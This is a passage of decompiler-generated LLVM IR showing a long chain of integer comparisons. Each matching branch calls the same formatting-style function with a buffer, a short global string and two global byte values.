dec_label_pc_c7cc:                                ; preds = %dec_label_pc_c7c0
  %v2_c7cc = ptrtoint i32* %stack_var_-36 to i32
  %v3_c7d8 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_c7e4 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_c7f0 = sext i8 %v3_c7d8 to i32
  %v6_c7f0 = sext i8 %v3_c7e4 to i32
  %v8_c7f0 = call i32 @function_92f8(i32 %v2_c7cc, i32 ptrtoint ([12 x i8]* @global_var_21988.278 to i32), i32 %v4_c7f0, i32 %v6_c7f0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c7f4

dec_label_pc_c7f4:                                ; preds = %dec_label_pc_c7c0, %dec_label_pc_c7cc
  %v7_c7f8 = icmp eq i32 %v2_aef8, 111
  br i1 %v7_c7f8, label %dec_label_pc_c800, label %dec_label_pc_c828

dec_label_pc_c800:                                ; preds = %dec_label_pc_c7f4
  %v2_c800 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c80c = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_c818 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_c824 = sext i8 %v3_c80c to i32
  %v6_c824 = sext i8 %v3_c818 to i32
  %v8_c824 = call i32 @function_92f8(i32 %v2_c800, i32 ptrtoint ([12 x i8]* @global_var_21994.280 to i32), i32 %v4_c824, i32 %v6_c824, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c828

dec_label_pc_c828:                                ; preds = %dec_label_pc_c7f4, %dec_label_pc_c800
  %v7_c82c = icmp eq i32 %v2_aef8, 112
  br i1 %v7_c82c, label %dec_label_pc_c834, label %dec_label_pc_c85c

dec_label_pc_c834:                                ; preds = %dec_label_pc_c828
  %v2_c834 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c840 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_c84c = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_c858 = sext i8 %v3_c840 to i32
  %v6_c858 = sext i8 %v3_c84c to i32
  %v8_c858 = call i32 @function_92f8(i32 %v2_c834, i32 ptrtoint ([12 x i8]* @global_var_219a0.282 to i32), i32 %v4_c858, i32 %v6_c858, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c85c

dec_label_pc_c85c:                                ; preds = %dec_label_pc_c828, %dec_label_pc_c834
  %v7_c860 = icmp eq i32 %v2_aef8, 113
  br i1 %v7_c860, label %dec_label_pc_c868, label %dec_label_pc_c890

dec_label_pc_c868:                                ; preds = %dec_label_pc_c85c
  %v2_c868 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c874 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_c880 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_c88c = sext i8 %v3_c874 to i32
  %v6_c88c = sext i8 %v3_c880 to i32
  %v8_c88c = call i32 @function_92f8(i32 %v2_c868, i32 ptrtoint ([13 x i8]* @global_var_219ac.284 to i32), i32 %v4_c88c, i32 %v6_c88c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c890

dec_label_pc_c890:                                ; preds = %dec_label_pc_c85c, %dec_label_pc_c868
  %v7_c894 = icmp eq i32 %v2_aef8, 114
  br i1 %v7_c894, label %dec_label_pc_c89c, label %dec_label_pc_c8c4

dec_label_pc_c89c:                                ; preds = %dec_label_pc_c890
  %v2_c89c = ptrtoint i32* %stack_var_-36 to i32
  %v3_c8a8 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_c8b4 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_c8c0 = sext i8 %v3_c8a8 to i32
  %v6_c8c0 = sext i8 %v3_c8b4 to i32
  %v8_c8c0 = call i32 @function_92f8(i32 %v2_c89c, i32 ptrtoint ([13 x i8]* @global_var_219bc.286 to i32), i32 %v4_c8c0, i32 %v6_c8c0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c8c4

dec_label_pc_c8c4:                                ; preds = %dec_label_pc_c890, %dec_label_pc_c89c
  %v7_c8c8 = icmp eq i32 %v2_aef8, 115
  br i1 %v7_c8c8, label %dec_label_pc_c8d0, label %dec_label_pc_c8f8

dec_label_pc_c8d0:                                ; preds = %dec_label_pc_c8c4
  %v2_c8d0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c8dc = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_c8e8 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_c8f4 = sext i8 %v3_c8dc to i32
  %v6_c8f4 = sext i8 %v3_c8e8 to i32
  %v8_c8f4 = call i32 @function_92f8(i32 %v2_c8d0, i32 ptrtoint ([14 x i8]* @global_var_219cc.288 to i32), i32 %v4_c8f4, i32 %v6_c8f4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c8f8

dec_label_pc_c8f8:                                ; preds = %dec_label_pc_c8c4, %dec_label_pc_c8d0
  %v7_c8fc = icmp eq i32 %v2_aef8, 116
  br i1 %v7_c8fc, label %dec_label_pc_c904, label %dec_label_pc_c92c

dec_label_pc_c904:                                ; preds = %dec_label_pc_c8f8
  %v2_c904 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c910 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_c91c = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_c928 = sext i8 %v3_c910 to i32
  %v6_c928 = sext i8 %v3_c91c to i32
  %v8_c928 = call i32 @function_92f8(i32 %v2_c904, i32 ptrtoint ([13 x i8]* @global_var_219dc.290 to i32), i32 %v4_c928, i32 %v6_c928, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c92c

dec_label_pc_c92c:                                ; preds = %dec_label_pc_c8f8, %dec_label_pc_c904
  %v7_c930 = icmp eq i32 %v2_aef8, 117
  br i1 %v7_c930, label %dec_label_pc_c938, label %dec_label_pc_c960

dec_label_pc_c938:                                ; preds = %dec_label_pc_c92c
  %v2_c938 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c944 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_c950 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_c95c = sext i8 %v3_c944 to i32
  %v6_c95c = sext i8 %v3_c950 to i32
  %v8_c95c = call i32 @function_92f8(i32 %v2_c938, i32 ptrtoint ([14 x i8]* @global_var_219ec.292 to i32), i32 %v4_c95c, i32 %v6_c95c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c960

dec_label_pc_c960:                                ; preds = %dec_label_pc_c92c, %dec_label_pc_c938
  %v7_c964 = icmp eq i32 %v2_aef8, 118
  br i1 %v7_c964, label %dec_label_pc_c96c, label %dec_label_pc_c994

dec_label_pc_c96c:                                ; preds = %dec_label_pc_c960
  %v2_c96c = ptrtoint i32* %stack_var_-36 to i32
  %v3_c978 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_c984 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_c990 = sext i8 %v3_c978 to i32
  %v6_c990 = sext i8 %v3_c984 to i32
  %v8_c990 = call i32 @function_92f8(i32 %v2_c96c, i32 ptrtoint ([14 x i8]* @global_var_219fc.294 to i32), i32 %v4_c990, i32 %v6_c990, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c994

dec_label_pc_c994:                                ; preds = %dec_label_pc_c960, %dec_label_pc_c96c
  %v7_c998 = icmp eq i32 %v2_aef8, 119
  br i1 %v7_c998, label %dec_label_pc_c9a0, label %dec_label_pc_c9c8

dec_label_pc_c9a0:                                ; preds = %dec_label_pc_c994
  %v2_c9a0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c9ac = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_c9b8 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_c9c4 = sext i8 %v3_c9ac to i32
  %v6_c9c4 = sext i8 %v3_c9b8 to i32
  %v8_c9c4 = call i32 @function_92f8(i32 %v2_c9a0, i32 ptrtoint ([13 x i8]* @global_var_21a0c.296 to i32), i32 %v4_c9c4, i32 %v6_c9c4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c9c8

dec_label_pc_c9c8:                                ; preds = %dec_label_pc_c994, %dec_label_pc_c9a0
  %v7_c9cc = icmp eq i32 %v2_aef8, 120
  br i1 %v7_c9cc, label %dec_label_pc_c9d4, label %dec_label_pc_c9fc

dec_label_pc_c9d4:                                ; preds = %dec_label_pc_c9c8
  %v2_c9d4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c9e0 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_c9ec = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_c9f8 = sext i8 %v3_c9e0 to i32
  %v6_c9f8 = sext i8 %v3_c9ec to i32
  %v8_c9f8 = call i32 @function_92f8(i32 %v2_c9d4, i32 ptrtoint ([13 x i8]* @global_var_21a1c.298 to i32), i32 %v4_c9f8, i32 %v6_c9f8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c9fc

dec_label_pc_c9fc:                                ; preds = %dec_label_pc_c9c8, %dec_label_pc_c9d4
  %v7_ca00 = icmp eq i32 %v2_aef8, 121
  br i1 %v7_ca00, label %dec_label_pc_ca08, label %dec_label_pc_ca30

dec_label_pc_ca08:                                ; preds = %dec_label_pc_c9fc
  %v2_ca08 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ca14 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_ca20 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_ca2c = sext i8 %v3_ca14 to i32
  %v6_ca2c = sext i8 %v3_ca20 to i32
  %v8_ca2c = call i32 @function_92f8(i32 %v2_ca08, i32 ptrtoint ([13 x i8]* @global_var_21a2c.300 to i32), i32 %v4_ca2c, i32 %v6_ca2c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ca30

dec_label_pc_ca30:                                ; preds = %dec_label_pc_c9fc, %dec_label_pc_ca08
  %v7_ca34 = icmp eq i32 %v2_aef8, 122
  br i1 %v7_ca34, label %dec_label_pc_ca3c, label %dec_label_pc_ca64

dec_label_pc_ca3c:                                ; preds = %dec_label_pc_ca30
  %v2_ca3c = ptrtoint i32* %stack_var_-36 to i32
  %v3_ca48 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_ca54 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_ca60 = sext i8 %v3_ca48 to i32
  %v6_ca60 = sext i8 %v3_ca54 to i32
  %v8_ca60 = call i32 @function_92f8(i32 %v2_ca3c, i32 ptrtoint ([13 x i8]* @global_var_21a3c.302 to i32), i32 %v4_ca60, i32 %v6_ca60, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ca64

dec_label_pc_ca64:                                ; preds = %dec_label_pc_ca30, %dec_label_pc_ca3c
  %v7_ca68 = icmp eq i32 %v2_aef8, 123
  br i1 %v7_ca68, label %dec_label_pc_ca70, label %dec_label_pc_ca98

dec_label_pc_ca70:                                ; preds = %dec_label_pc_ca64
  %v2_ca70 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ca7c = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_ca88 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_ca94 = sext i8 %v3_ca7c to i32
  %v6_ca94 = sext i8 %v3_ca88 to i32
  %v8_ca94 = call i32 @function_92f8(i32 %v2_ca70, i32 ptrtoint ([13 x i8]* @global_var_21a4c.304 to i32), i32 %v4_ca94, i32 %v6_ca94, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ca98

dec_label_pc_ca98:                                ; preds = %dec_label_pc_ca64, %dec_label_pc_ca70
  %v7_ca9c = icmp eq i32 %v2_aef8, 124
  br i1 %v7_ca9c, label %dec_label_pc_caa4, label %dec_label_pc_cacc

dec_label_pc_caa4:                                ; preds = %dec_label_pc_ca98
  %v2_caa4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cab0 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_cabc = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_cac8 = sext i8 %v3_cab0 to i32
  %v6_cac8 = sext i8 %v3_cabc to i32
  %v8_cac8 = call i32 @function_92f8(i32 %v2_caa4, i32 ptrtoint ([13 x i8]* @global_var_21a5c.306 to i32), i32 %v4_cac8, i32 %v6_cac8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cacc

dec_label_pc_cacc:                                ; preds = %dec_label_pc_ca98, %dec_label_pc_caa4
  %v7_cad0 = icmp eq i32 %v2_aef8, 125
  br i1 %v7_cad0, label %dec_label_pc_cad8, label %dec_label_pc_cb00

dec_label_pc_cad8:                                ; preds = %dec_label_pc_cacc
  %v2_cad8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cae4 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_caf0 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_cafc = sext i8 %v3_cae4 to i32
  %v6_cafc = sext i8 %v3_caf0 to i32
  %v8_cafc = call i32 @function_92f8(i32 %v2_cad8, i32 ptrtoint ([13 x i8]* @global_var_21a6c.308 to i32), i32 %v4_cafc, i32 %v6_cafc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cb00

dec_label_pc_cb00:                                ; preds = %dec_label_pc_cacc, %dec_label_pc_cad8
  %v7_cb04 = icmp eq i32 %v2_aef8, 126
  br i1 %v7_cb04, label %dec_label_pc_cb0c, label %dec_label_pc_cb34

dec_label_pc_cb0c:                                ; preds = %dec_label_pc_cb00
  %v2_cb0c = ptrtoint i32* %stack_var_-36 to i32
  %v3_cb18 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_cb24 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_cb30 = sext i8 %v3_cb18 to i32
  %v6_cb30 = sext i8 %v3_cb24 to i32
  %v8_cb30 = call i32 @function_92f8(i32 %v2_cb0c, i32 ptrtoint ([13 x i8]* @global_var_21a7c.310 to i32), i32 %v4_cb30, i32 %v6_cb30, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cb34

dec_label_pc_cb34:                                ; preds = %dec_label_pc_cb00, %dec_label_pc_cb0c
  %v7_cb38 = icmp eq i32 %v2_aef8, 127
  br i1 %v7_cb38, label %dec_label_pc_cb40, label %dec_label_pc_cb68

dec_label_pc_cb40:                                ; preds = %dec_label_pc_cb34
  %v2_cb40 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cb4c = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_cb58 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_cb64 = sext i8 %v3_cb4c to i32
  %v6_cb64 = sext i8 %v3_cb58 to i32
  %v8_cb64 = call i32 @function_92f8(i32 %v2_cb40, i32 ptrtoint ([13 x i8]* @global_var_21a8c.312 to i32), i32 %v4_cb64, i32 %v6_cb64, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cb68

dec_label_pc_cb68:                                ; preds = %dec_label_pc_cb34, %dec_label_pc_cb40
  %v7_cb6c = icmp eq i32 %v2_aef8, 128
  br i1 %v7_cb6c, label %dec_label_pc_cb74, label %dec_label_pc_cb9c

dec_label_pc_cb74:                                ; preds = %dec_label_pc_cb68
  %v2_cb74 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cb80 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_cb8c = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_cb98 = sext i8 %v3_cb80 to i32
  %v6_cb98 = sext i8 %v3_cb8c to i32
  %v8_cb98 = call i32 @function_92f8(i32 %v2_cb74, i32 ptrtoint ([13 x i8]* @global_var_21a9c.314 to i32), i32 %v4_cb98, i32 %v6_cb98, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cb9c

dec_label_pc_cb9c:                                ; preds = %dec_label_pc_cb68, %dec_label_pc_cb74
  %v7_cba0 = icmp eq i32 %v2_aef8, 129
  br i1 %v7_cba0, label %dec_label_pc_cba8, label %dec_label_pc_cbd0

dec_label_pc_cba8:                                ; preds = %dec_label_pc_cb9c
  %v2_cba8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cbb4 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_cbc0 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_cbcc = sext i8 %v3_cbb4 to i32
  %v6_cbcc = sext i8 %v3_cbc0 to i32
  %v8_cbcc = call i32 @function_92f8(i32 %v2_cba8, i32 ptrtoint ([13 x i8]* @global_var_21aac.316 to i32), i32 %v4_cbcc, i32 %v6_cbcc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cbd0

dec_label_pc_cbd0:                                ; preds = %dec_label_pc_cb9c, %dec_label_pc_cba8
  %v7_cbd4 = icmp eq i32 %v2_aef8, 130
  br i1 %v7_cbd4, label %dec_label_pc_cbdc, label %dec_label_pc_cc04

dec_label_pc_cbdc:                                ; preds = %dec_label_pc_cbd0
  %v2_cbdc = ptrtoint i32* %stack_var_-36 to i32
  %v3_cbe8 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_cbf4 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_cc00 = sext i8 %v3_cbe8 to i32
  %v6_cc00 = sext i8 %v3_cbf4 to i32
  %v8_cc00 = call i32 @function_92f8(i32 %v2_cbdc, i32 ptrtoint ([13 x i8]* @global_var_21abc.318 to i32), i32 %v4_cc00, i32 %v6_cc00, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cc04

dec_label_pc_cc04:                                ; preds = %dec_label_pc_cbd0, %dec_label_pc_cbdc
  %v7_cc08 = icmp eq i32 %v2_aef8, 131
  br i1 %v7_cc08, label %dec_label_pc_cc10, label %dec_label_pc_cc38

dec_label_pc_cc10:                                ; preds = %dec_label_pc_cc04
  %v2_cc10 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cc1c = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_cc28 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_cc34 = sext i8 %v3_cc1c to i32
  %v6_cc34 = sext i8 %v3_cc28 to i32
  %v8_cc34 = call i32 @function_92f8(i32 %v2_cc10, i32 ptrtoint ([13 x i8]* @global_var_21acc.320 to i32), i32 %v4_cc34, i32 %v6_cc34, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cc38

dec_label_pc_cc38:                                ; preds = %dec_label_pc_cc04, %dec_label_pc_cc10
  %v7_cc3c = icmp eq i32 %v2_aef8, 132
  br i1 %v7_cc3c, label %dec_label_pc_cc44, label %dec_label_pc_cc6c

dec_label_pc_cc44:                                ; preds = %dec_label_pc_cc38
  %v2_cc44 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cc50 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_cc5c = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_cc68 = sext i8 %v3_cc50 to i32
  %v6_cc68 = sext i8 %v3_cc5c to i32
  %v8_cc68 = call i32 @function_92f8(i32 %v2_cc44, i32 ptrtoint ([13 x i8]* @global_var_21adc.322 to i32), i32 %v4_cc68, i32 %v6_cc68, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cc6c

dec_label_pc_cc6c:                                ; preds = %dec_label_pc_cc38, %dec_label_pc_cc44
  %v7_cc70 = icmp eq i32 %v2_aef8, 133
  br i1 %v7_cc70, label %dec_label_pc_cc78, label %dec_label_pc_cca0

dec_label_pc_cc78:                                ; preds = %dec_label_pc_cc6c
  %v2_cc78 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cc84 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_cc90 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_cc9c = sext i8 %v3_cc84 to i32
  %v6_cc9c = sext i8 %v3_cc90 to i32
  %v8_cc9c = call i32 @function_92f8(i32 %v2_cc78, i32 ptrtoint ([13 x i8]* @global_var_21aec.324 to i32), i32 %v4_cc9c, i32 %v6_cc9c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cca0

dec_label_pc_cca0:                                ; preds = %dec_label_pc_cc6c, %dec_label_pc_cc78
  %v7_cca4 = icmp eq i32 %v2_aef8, 134
  br i1 %v7_cca4, label %dec_label_pc_ccac, label %dec_label_pc_ccd4

dec_label_pc_ccac:                                ; preds = %dec_label_pc_cca0
  %v2_ccac = ptrtoint i32* %stack_var_-36 to i32
  %v3_ccb8 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_ccc4 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_ccd0 = sext i8 %v3_ccb8 to i32
  %v6_ccd0 = sext i8 %v3_ccc4 to i32
  %v8_ccd0 = call i32 @function_92f8(i32 %v2_ccac, i32 ptrtoint ([13 x i8]* @global_var_21afc.326 to i32), i32 %v4_ccd0, i32 %v6_ccd0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ccd4

dec_label_pc_ccd4:                                ; preds = %dec_label_pc_cca0, %dec_label_pc_ccac
  %v7_ccd8 = icmp eq i32 %v2_aef8, 135
  br i1 %v7_ccd8, label %dec_label_pc_cce0, label %dec_label_pc_cd08

dec_label_pc_cce0:                                ; preds = %dec_label_pc_ccd4
  %v2_cce0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ccec = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_ccf8 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_cd04 = sext i8 %v3_ccec to i32
  %v6_cd04 = sext i8 %v3_ccf8 to i32
  %v8_cd04 = call i32 @function_92f8(i32 %v2_cce0, i32 ptrtoint ([13 x i8]* @global_var_21b0c.328 to i32), i32 %v4_cd04, i32 %v6_cd04, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cd08

dec_label_pc_cd08:                                ; preds = %dec_label_pc_ccd4, %dec_label_pc_cce0
  %v7_cd0c = icmp eq i32 %v2_aef8, 136
  br i1 %v7_cd0c, label %dec_label_pc_cd14, label %dec_label_pc_cd3c

dec_label_pc_cd14:                                ; preds = %dec_label_pc_cd08
  %v2_cd14 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cd20 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_cd2c = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_cd38 = sext i8 %v3_cd20 to i32
  %v6_cd38 = sext i8 %v3_cd2c to i32
  %v8_cd38 = call i32 @function_92f8(i32 %v2_cd14, i32 ptrtoint ([13 x i8]* @global_var_21b1c.330 to i32), i32 %v4_cd38, i32 %v6_cd38, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cd3c

dec_label_pc_cd3c:                                ; preds = %dec_label_pc_cd08, %dec_label_pc_cd14
  %v7_cd40 = icmp eq i32 %v2_aef8, 137
  br i1 %v7_cd40, label %dec_label_pc_cd48, label %dec_label_pc_cd70

dec_label_pc_cd48:                                ; preds = %dec_label_pc_cd3c
  %v2_cd48 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cd54 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_cd60 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_cd6c = sext i8 %v3_cd54 to i32
  %v6_cd6c = sext i8 %v3_cd60 to i32
  %v8_cd6c = call i32 @function_92f8(i32 %v2_cd48, i32 ptrtoint ([13 x i8]* @global_var_21b2c.332 to i32), i32 %v4_cd6c, i32 %v6_cd6c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cd70

dec_label_pc_cd70:                                ; preds = %dec_label_pc_cd3c, %dec_label_pc_cd48
  %v7_cd74 = icmp eq i32 %v2_aef8, 138
  br i1 %v7_cd74, label %dec_label_pc_cd7c, label %dec_label_pc_cda4

dec_label_pc_cd7c:                                ; preds = %dec_label_pc_cd70
  %v2_cd7c = ptrtoint i32* %stack_var_-36 to i32
  %v3_cd88 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_cd94 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_cda0 = sext i8 %v3_cd88 to i32
  %v6_cda0 = sext i8 %v3_cd94 to i32
  %v8_cda0 = call i32 @function_92f8(i32 %v2_cd7c, i32 ptrtoint ([13 x i8]* @global_var_21b3c.334 to i32), i32 %v4_cda0, i32 %v6_cda0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cda4

dec_label_pc_cda4:                                ; preds = %dec_label_pc_cd70, %dec_label_pc_cd7c
  %v7_cda8 = icmp eq i32 %v2_aef8, 139
  br i1 %v7_cda8, label %dec_label_pc_cdb0, label %dec_label_pc_cdd8

dec_label_pc_cdb0:                                ; preds = %dec_label_pc_cda4
  %v2_cdb0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cdbc = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_cdc8 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_cdd4 = sext i8 %v3_cdbc to i32
  %v6_cdd4 = sext i8 %v3_cdc8 to i32
  %v8_cdd4 = call i32 @function_92f8(i32 %v2_cdb0, i32 ptrtoint ([13 x i8]* @global_var_21b4c.336 to i32), i32 %v4_cdd4, i32 %v6_cdd4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cdd8

dec_label_pc_cdd8:                                ; preds = %dec_label_pc_cda4, %dec_label_pc_cdb0
  %v7_cddc = icmp eq i32 %v2_aef8, 140
  br i1 %v7_cddc, label %dec_label_pc_cde4, label %dec_label_pc_ce0c

dec_label_pc_cde4:                                ; preds = %dec_label_pc_cdd8
  %v2_cde4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cdf0 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_cdfc = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_ce08 = sext i8 %v3_cdf0 to i32
  %v6_ce08 = sext i8 %v3_cdfc to i32
  %v8_ce08 = call i32 @function_92f8(i32 %v2_cde4, i32 ptrtoint ([13 x i8]* @global_var_21b5c.338 to i32), i32 %v4_ce08, i32 %v6_ce08, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ce0c

dec_label_pc_ce0c:                                ; preds = %dec_label_pc_cdd8, %dec_label_pc_cde4
  %v7_ce10 = icmp eq i32 %v2_aef8, 141
  br i1 %v7_ce10, label %dec_label_pc_ce18, label %dec_label_pc_ce40

dec_label_pc_ce18:                                ; preds = %dec_label_pc_ce0c
  %v2_ce18 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ce24 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_ce30 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_ce3c = sext i8 %v3_ce24 to i32
  %v6_ce3c = sext i8 %v3_ce30 to i32
  %v8_ce3c = call i32 @function_92f8(i32 %v2_ce18, i32 ptrtoint ([13 x i8]* @global_var_21b6c.340 to i32), i32 %v4_ce3c, i32 %v6_ce3c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ce40

dec_label_pc_ce40:                                ; preds = %dec_label_pc_ce0c, %dec_label_pc_ce18
  %v7_ce44 = icmp eq i32 %v2_aef8, 142
  br i1 %v7_ce44, label %dec_label_pc_ce4c, label %dec_label_pc_ce74

dec_label_pc_ce4c:                                ; preds = %dec_label_pc_ce40
  %v2_ce4c = ptrtoint i32* %stack_var_-36 to i32
  %v3_ce58 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_ce64 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_ce70 = sext i8 %v3_ce58 to i32
  %v6_ce70 = sext i8 %v3_ce64 to i32
  %v8_ce70 = call i32 @function_92f8(i32 %v2_ce4c, i32 ptrtoint ([13 x i8]* @global_var_21b7c.342 to i32), i32 %v4_ce70, i32 %v6_ce70, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ce74

dec_label_pc_ce74:                                ; preds = %dec_label_pc_ce40, %dec_label_pc_ce4c
  %v7_ce78 = icmp eq i32 %v2_aef8, 143
  br i1 %v7_ce78, label %dec_label_pc_ce80, label %dec_label_pc_cea8

dec_label_pc_ce80:                                ; preds = %dec_label_pc_ce74
  %v2_ce80 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ce8c = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_ce98 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_cea4 = sext i8 %v3_ce8c to i32
  %v6_cea4 = sext i8 %v3_ce98 to i32
  %v8_cea4 = call i32 @function_92f8(i32 %v2_ce80, i32 ptrtoint ([13 x i8]* @global_var_21b8c.344 to i32), i32 %v4_cea4, i32 %v6_cea4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cea8

dec_label_pc_cea8:                                ; preds = %dec_label_pc_ce74, %dec_label_pc_ce80
  %v7_ceac = icmp eq i32 %v2_aef8, 144
  br i1 %v7_ceac, label %dec_label_pc_ceb4, label %dec_label_pc_cedc

dec_label_pc_ceb4:                                ; preds = %dec_label_pc_cea8
  %v2_ceb4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cec0 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_cecc = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_ced8 = sext i8 %v3_cec0 to i32
  %v6_ced8 = sext i8 %v3_cecc to i32
  %v8_ced8 = call i32 @function_92f8(i32 %v2_ceb4, i32 ptrtoint ([13 x i8]* @global_var_21b9c.346 to i32), i32 %v4_ced8, i32 %v6_ced8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cedc

dec_label_pc_cedc:                                ; preds = %dec_label_pc_cea8, %dec_label_pc_ceb4
  %v7_cee0 = icmp eq i32 %v2_aef8, 145
  br i1 %v7_cee0, label %dec_label_pc_cee8, label %dec_label_pc_cf10

